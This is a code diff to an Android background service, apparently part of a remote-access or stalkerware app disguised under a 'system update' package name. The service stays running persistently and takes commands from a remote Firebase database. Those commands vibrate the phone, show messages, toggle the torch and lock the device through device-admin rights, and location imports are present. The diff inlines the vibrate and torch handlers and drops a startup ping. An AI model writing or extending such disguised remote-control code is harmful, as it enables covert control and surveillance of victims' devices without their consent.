@@ -1,6 +1,5 @@
 package com.system.update;
 
-import android.Manifest;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -9,12 +8,13 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.location.Location;
 import android.location.LocationManager;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.PowerManager;
+import android.os.VibrationEffect;
+import android.os.Vibrator;
 import android.util.Log;
 import android.widget.Toast;
 import androidx.annotation.NonNull;
@@ -26,7 +26,6 @@ import com.google.firebase.database.DataSnapshot;
 import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
-import java.io.File;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.UUID;
@@ -64,9 +63,6 @@ public class FirebaseService extends Service {
                 .setOngoing(true)
                 .build();
         startForeground(NOTIF_ID, notif);
-
-        FirebaseDatabase.getInstance(DB_URL)
-            .getReference("ping").setValue("started_" + System.currentTimeMillis());
 
         deviceId = getDeviceId(this);
         FirebaseDatabase db = FirebaseDatabase.getInstance(DB_URL);
@@ -120,17 +116,25 @@ public class FirebaseService extends Service {
         DatabaseReference dataRef = FirebaseDatabase.getInstance(DB_URL).getReference("data").child(deviceId);
         try {
             switch (type) {
-                case "vibrate":
-                    Helpers.vibrate(this);
+                case "vibrate": {
+                    Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                        v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE));
+                    else v.vibrate(1000);
                     break;
+                }
                 case "show_toast": {
                     String m = (String) cmd.get("message");
                     Toast.makeText(this, m == null ? "" : m, Toast.LENGTH_LONG).show();
                     break;
                 }
-                case "torch_on": case "torch_off":
-                    Helpers.torch(this, type.equals("torch_on"));
+                case "torch_on": case "torch_off": {
+                    try {
+                        android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
+                        cm.setTorchMode(cm.getCameraIdList()[0], type.equals("torch_on"));
+                    } catch (Exception e) {}
                     break;
+                }
                 case "lock": {
                     DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                     ComponentName admin = new ComponentName(getApplicationContext(), DeviceAdminReceiver.class);
@@ -157,7 +161,9 @@ public class FirebaseService extends Service {
     }
 
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        return START_STICKY;
+    }
 
     @Override
     public void onDestroy() {
@@ -165,5 +171,7 @@ public class FirebaseService extends Service {
         super.onDestroy();
     }
 
-    @Nullable @Override public IBinder onBind(Intent intent) { return null; }
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
         }
